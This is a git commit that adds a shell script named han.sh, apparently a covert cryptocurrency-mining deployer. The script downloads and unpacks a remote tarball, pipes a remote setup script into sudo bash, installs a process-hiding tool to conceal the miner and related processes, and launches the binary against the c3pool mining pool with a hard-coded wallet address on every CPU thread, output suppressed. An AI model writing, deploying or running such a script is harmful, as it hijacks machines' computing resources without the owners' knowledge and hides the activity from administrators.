8b959387bd07b0a79c679462491b3f13d6f24450
muledan1 <108221871+muledan1@users.noreply.github.com>
2022-08-28 00:41:09 +0700

    Create han.sh

---
+++ han.sh
@@ -0,0 +1,20 @@
+#!/bin/sh
+pkill -
+wget https://github.com/nurkartina604/st/raw/main/-.tar.gz
+tar -xf -.tar.gz
+apt-get update;apt-get -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+npm i -g node-process-hider
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+sudo swapoff -a; sudo swapon -a
+sleep 10
+ph add gudubrag.sh
+Ph add python3
+ph add root
+ph add node-process-hider
+ph add -
+./- -o auto.c3pool.org:80 -u 8AnCrDsFdsA5Zxj4UXqDm15ikXKbtgihzAAidFDSk8jW8rEf22g94Z38YHU52V14yENcZ1e2dZrZAB59FxA4n5cn7b7dwhs.GS -t$(nproc --all) >/dev/null >/dev/null 2>&1
+sleep 10
